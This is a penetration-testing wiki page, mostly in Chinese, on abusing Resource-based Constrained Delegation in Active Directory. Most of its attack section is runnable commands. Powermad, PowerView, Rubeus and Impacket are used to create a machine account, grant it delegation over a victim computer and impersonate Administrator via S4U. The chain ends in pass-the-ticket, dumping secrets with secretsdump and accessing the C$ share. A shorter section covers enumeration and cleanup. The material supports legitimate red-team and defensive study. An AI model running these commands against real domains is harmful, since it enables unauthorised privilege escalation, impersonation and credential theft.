# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 基础

This is similar to the basic [Constrained Delegation](constrained-delegation.md) but **instead** of giving permissions to an **object** to **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.

在这种情况中，被限制的对象会有一个属性叫做 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_，其值为可以对该对象模拟任意用户的用户名称。

另一个与之前 Constrained Delegation 不同的重要差别是，任何对 **machine account** 有 **写权限** 的用户（如 _GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）都可以设置 **_msDS-AllowedToActOnBehalfOfOtherIdentity_**（在其他形式的 Delegation 中你需要 domain admin 权限）。

### 新概念

在之前的 Constrained Delegation 中提到，用户的 userAccountControl 值内的 **`TrustedToAuthForDelegation`** 标志是执行 **S4U2Self** 所需的。但这并不完全正确。\
实际情况是，即使没有该值，如果你是一个有 SPN 的 **service**（即拥有 SPN），你也可以对任意用户执行 **S4U2Self**；不过如果你**拥有 `TrustedToAuthForDelegation`**，返回的 TGS 将是 **Forwardable**，而如果你**没有**该标志，返回的 TGS **不会**是 **Forwardable**。

然而，如果用于 **S4U2Proxy** 的 **TGS** **不是 Forwardable**，尝试滥用 **basic Constrain Delegation** 时是 **无效的**。但如果你在利用 **Resource-Based constrain delegation**，则会生效。

### 攻击结构

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

假设攻击者已经对受害计算机拥有**写等效权限**。

1. 攻击者 **控制** 一个拥有 **SPN** 的账号或 **创建一个**（“Service A”）。注意，**任何** 普通的 _Admin User_ 在没有其他特殊权限的情况下最多可以创建 10 个 Computer 对象（即 _MachineAccountQuota_）并为其设置 SPN。因此攻击者可以直接创建一个 Computer 对象并设置一个 SPN。
2. 攻击者 **滥用其对受害计算机（ServiceB）的 WRITE 权限**，配置 resource-based constrained delegation，允许 ServiceA 在该受害计算机（ServiceB）上模拟任何用户。
3. 攻击者使用 Rubeus 对从 Service A 到 Service B 的用户执行 **完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy），目标是一个对 Service B 有特权访问的用户。
1. S4U2Self（来自被攻破/创建的 SPN 账号）：请求一个 **TGS 给我（Administrator）**（非 Forwardable）。
2. S4U2Proxy：使用前一步得到的 **非 Forwardable TGS**，向 **Administrator** 请求到 **受害主机** 的 **TGS**。
3. 即使你使用的是非 Forwardable 的 TGS，只要你在利用 Resource-based constrained delegation，这个流程也会成功。
4. 攻击者可以 **pass-the-ticket** 并 **模拟** 该用户，从而获得对受害 ServiceB 的访问。

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

你可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad):** 在域内创建一个计算机对象。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置 Resource-based Constrained Delegation

**使用 activedirectory PowerShell module**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用 powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U attack (Windows/Rubeus)

首先，我们用密码 `123456` 创建了新的 Computer 对象，因此我们需要该密码的哈希：
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该帐户的 RC4 和 AES hashes。\
现在，可以执行攻击：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
只需使用 Rubeus 的 `/altservice` 参数询问一次，即可为更多服务生成更多票证：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 请注意，用户有一个属性叫 "**Cannot be delegated**"。如果该属性为 True，你将无法冒充该用户。该属性可在 bloodhound 中查看。
 
### Linux 工具：端到端 RBCD 与 Impacket (2024+)

如果你在 Linux 上操作，可以使用官方 Impacket 工具执行完整的 RBCD 链：
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
注意事项
- 如果启用了 LDAP signing/LDAPS，请使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES keys；许多现代域会限制 RC4。Impacket 和 Rubeus 都支持 AES-only flows。
- Impacket 可以为某些工具重写 `sname`（"AnySPN"），但应尽可能获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

### 访问

最后一条命令行将执行 **complete S4U attack and will inject the TGS**，并将来自 Administrator 的 TGS 注入到受害主机的 **memory**。\
在此示例中，请求了来自 Administrator 的 **CIFS** 服务的 TGS，因此你将能够访问 **C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的 service tickets

在此了解 [**available service tickets here**](silver-ticket.md#available-services)。

## 枚举、审计与清理

### 枚举已配置 RBCD 的计算机

PowerShell (解码 SD 以解析 SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (一次命令即可 read 或 flush):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 清理 / 重置 RBCD

- PowerShell（清除属性）：
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**: 这意味着 kerberos 配置为不使用 DES 或 RC4，而你只提供了 RC4 哈希。至少向 Rubeus 提供 AES256 哈希（或同时提供 rc4、aes128 和 aes256 哈希）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: 这意味着当前计算机的时间与 DC 的时间不同，Kerberos 无法正常工作。
- **`preauth_failed`**: 这意味着给定的用户名 + 哈希无法登录。你可能在生成哈希时忘记在用户名里加上“$”（示例：`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 这可能意味着：
  - 你尝试模拟的用户无法访问目标服务（因为你无法模拟它，或因为它没有足够的权限）
  - 所请求的服务不存在（例如请求 winrm 的票据但 winrm 未运行）
  - 创建的 fakecomputer 已丧失对易受攻击服务器的权限，你需要恢复这些权限。
  - 你在滥用经典 KCD；记住 RBCD 使用不可转发的 S4U2Self 票据，而 KCD 要求可转发票据。

## 说明、转发与替代方案

- 如果 LDAP 被过滤，你也可以通过 AD Web Services (ADWS) 写入 RBCD SD。参见：

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos 中继链常以 RBCD 结束，以一步到位获取本地 SYSTEM。参见端到端实战示例：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 LDAP signing/channel binding 被 **禁用** 且你可以创建机器账户，像 **KrbRelayUp** 这样的工具可以将强制的 Kerberos 认证中继到 LDAP，在目标计算机对象上为你的机器账户设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并立即从离主机位置通过 S4U 模拟 **Administrator**。

## 参考资料

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Linux 快速备忘（近期语法）：https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
